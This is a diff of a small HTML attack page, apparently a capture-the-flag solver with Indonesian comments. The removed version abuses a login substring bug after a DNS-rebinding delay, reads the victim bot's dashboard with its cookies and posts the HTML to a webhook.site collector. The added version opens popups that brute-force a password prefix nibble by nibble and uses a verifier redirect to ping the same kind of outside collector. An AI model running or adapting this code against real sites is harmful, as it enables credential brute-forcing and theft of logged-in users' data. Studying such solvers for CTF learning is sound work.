@@ -1,34 +1,50 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>attack</title>
-<body>ok</body>
+<meta charset="utf-8" />
+<title>solver</title>
 <script>
-(async () => {
-  const WH = "https://webhook.site/a34dba35-cd60-4e77-bf38-101439a92e58"; // <= webhook kamu
-  const sleep = (ms)=>new Promise(r=>setTimeout(r,ms));
-  const ping = (msg)=>fetch(WH+"?log="+encodeURIComponent(msg)).catch(()=>{});
-  try {
-    // kasih jeda buat DNS rebind switch host → 1336
-    await sleep(1200);
+const HOST = "http://research.r3plican.dev:1336/";          
+const COLLECTOR = "https://webhook.site/1cb91557-b39f-409c-8289-4933835a8a37";              
+const USERNAME = "longlonglonguser";                             // asumsi default
 
-    // 1) login (bug substring: password in "replicanx....")
-    await fetch("/api/login?username=longlonglonguser&password=replicanx", {
-      credentials:"include", mode:"no-cors"
-    });
-    await sleep(400);
+const HEX = "0123456789abcdef";
+const PREFIX = "replicanx";
+const TRIES_PER_CAND = 6;    // 5-8 cukup, makin besar makin stabil
 
-    // 2) fetch dashboard (cookie HttpOnly dipakai otomatis)
-    const r = await fetch("/dashboard", { credentials:"include" });
-    const t = await r.text();
+async function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
 
-    // 3) exfil ke webhook (POST body = HTML dashboard)
-    await fetch(WH, { method:"POST", headers:{ "Content-Type":"text/plain" }, body:t });
+async function tryCandidate(prefix){
+  // buka popup ke Flask (cross-origin), kita masih bisa set location berkali-kali
+  const w = window.open(`${HOST}/api/login?username=${USERNAME}&password=${encodeURIComponent(prefix)}`, "_blank");
+  const t0 = performance.now();
 
-    // sinyal sukses kecil (GET) biar keliatan cepat
-    await ping("ok");
-  } catch(e) {
-    await ping("err:"+String(e));
+  // beri waktu network settle sedikit
+  await sleep(300);
+  try { w.location = `${HOST}/dashboard/`; } catch(e) {}
+  await sleep(150);
+
+  // trigger verifier -> redirect ke collector kita (jadi “ping”)
+  const ping = `${COLLECTOR}/ping?g=${encodeURIComponent(prefix)}&t=${Date.now()}`;
+  try { w.location = `${HOST}/verifier?q=${encodeURIComponent(ping)}`; } catch(e) {}
+
+  // kita tidak bisa menunggu network dari sini; biarkan bot menutup sendiri.
+  // script ini hanya men-*schedule* urutan aksi di tab popup.
+}
+
+async function run(){
+  // brute force 6 nibble, prefix-by-prefix
+  let known = PREFIX;
+  for (let i = 0; i < 6; i++){
+    // uji semua kandidat nibble di posisi ini
+    for (const c of HEX){
+      for (let k = 0; k < TRIES_PER_CAND; k++){
+        await tryCandidate(known + c);
+        await sleep(400); // jeda pendek
+      }
+    }
+    // kamu pilih nibble terbaik (median waktu terendah) dari log collector
+    // lalu update "known += bestNibble" dan reload solver.html dengan query ?known=<...>
   }
-})();
-</script>
+}
 
+run();
+</script>
